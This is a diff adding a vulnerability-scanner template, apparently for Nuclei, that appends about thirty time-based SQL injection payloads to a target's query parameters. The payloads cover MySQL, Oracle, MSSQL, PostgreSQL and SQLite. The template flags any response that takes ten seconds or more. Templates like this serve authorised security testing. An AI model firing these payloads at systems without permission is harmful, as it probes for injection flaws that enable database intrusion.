@@ -1,0 +1,56 @@
+id: sql-injection-Time
+info:
+  name: SQL Injection Time based
+  author: SHADOW
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+        - " AND sleep(10)"
+        - "' AND sleep(10)-- SHADOW"
+        - "\" AND sleep(10)-- SHADOW"
+        - ") AND sleep(10"
+        - ")' AND sleep(10)-- SHADOW"
+        - ")\" AND sleep(10)-- SHADOW"
+        - " AND dbms_pipe.receive_message(('a'),10)"
+        - "' AND dbms_pipe.receive_message(('a'),10)--"
+        - "\" AND dbms_pipe.receive_message(('a'),10)--"
+        - ") AND dbms_pipe.receive_message(('a'),10"
+        - ")' AND dbms_pipe.receive_message(('a'),10)--"
+        - ")\" AND dbms_pipe.receive_message(('a'),10)--"
+        - " AND WAITFOR DELAY '0:0:10'"
+        - "' AND WAITFOR DELAY '0:0:10'--"
+        - "\" AND WAITFOR DELAY '0:0:10'--"
+        - ") AND WAITFOR DELAY '0:0:10'--"
+        - ")' AND WAITFOR DELAY '0:0:10'--"
+        - ")\" AND WAITFOR DELAY '0:0:10'--"
+        - " AND pg_sleep(10)"
+        - "' AND pg_sleep(10)--"
+        - "\" AND pg_sleep(10)--"
+        - ") AND pg_sleep(10"
+        - ")' AND pg_sleep(10)--"
+        - ")\" AND pg_sleep(10)--"
+        - " AND sqlite3_sleep(10000)"
+        - "' AND sqlite3_sleep(10000)-- -"
+        - "\" AND sqlite3_sleep(10000)-- -"
+        - ") AND sqlite3_sleep(10000"
+        - ")' AND sqlite3_sleep(10000)-- -"
+        - ")\" AND sqlite3_sleep(10000)-- -"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=10"
